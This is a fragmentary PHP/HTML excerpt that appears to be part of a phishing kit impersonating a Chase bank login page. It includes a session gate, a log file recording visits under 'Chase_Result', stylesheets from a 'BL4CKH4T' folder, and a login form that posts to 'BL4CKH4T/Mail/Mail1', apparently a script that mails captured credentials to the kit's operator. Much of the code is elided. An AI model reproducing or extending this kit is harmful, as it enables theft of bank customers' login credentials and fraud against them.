...
if (!isset($_SESSION['CHASE_SPOX'])) {
  ...
  exit();
    ...
    $save2=fopen("BL4CKH4T/Chase_Result/total_login_view.txt","a+");
...
<head>
        ...
        <link rel="stylesheet" href="BL4CKH4T/Files/css/login.css">
        <link rel="stylesheet" href="BL4CKH4T/Files/css/dashboard.css">
...
<form id="login-form" method="POST"  action="BL4CKH4T/Mail/Mail1" >
